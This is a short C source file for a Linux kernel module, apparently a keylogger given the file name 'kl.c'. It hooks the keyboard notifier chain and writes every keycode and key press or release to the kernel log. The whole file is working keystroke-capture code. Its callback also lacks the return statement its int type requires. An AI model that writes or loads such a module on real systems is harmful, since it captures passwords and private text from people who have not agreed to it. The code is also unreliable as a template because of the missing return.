/*
 * =====================================================================================
 *
 *       Filename:  kl.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  30/10/14 09:14:18
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  YOUR NAME (), 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>

int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  struct vc_data *vc = param->vc;
  int ret = NOTIFY_OK;
  if(code == KBD_KEYCODE) {
    printk(KERN_DEBUG "Logged %i %s\n",param->value, (param->down ? "down" : "up"));
  }
}
static struct notifier_block nb = {
  .notifier_call = notify_intercept
};

static int __init kl_init(void) {
  register_keyboard_notifier(&nb);
  
  return 0;
}
static void __exit kl_exit(void) {
  unregister_keyboard_notifier(&nb);
}
module_init(kl_init);
module_exit(kl_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alex Jones <jonesax@hush.com>");
MODULE_DESCRIPTION("Example");
